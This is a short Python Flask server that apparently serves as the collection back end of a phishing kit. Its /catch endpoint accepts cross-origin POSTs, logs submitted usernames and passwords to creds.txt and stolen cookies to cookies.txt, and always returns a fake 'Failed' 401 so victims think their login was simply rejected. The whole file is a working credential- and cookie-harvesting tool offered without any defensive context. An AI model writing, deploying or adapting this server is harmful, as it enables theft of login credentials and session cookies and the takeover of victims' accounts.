from flask import Flask, request
from flask_cors import CORS


app = Flask(__name__)
CORS(app)


@app.route("/catch", methods=["POST"])
def catch():
	data = request.get_json()
	# print(data)
	if data.get("cookies"):
		cred = ""
		with open("creds.txt", "r") as cred_file:
			creds = cred_file.readlines()
			cred = creds[-1]

		with open("cookies.txt", "a") as file:
			file.write(f"{cred}{data["cookies"]}\n\n")
	else:
		with open("creds.txt", "a") as cred_file:
			cred_file.write(f"{data['username']} == {data['password']}\n")

	return ({"message": "Failed"}, 401)


if __name__ == "__main__":
    app.run(debug=False, host="0.0.0.0", port=5000)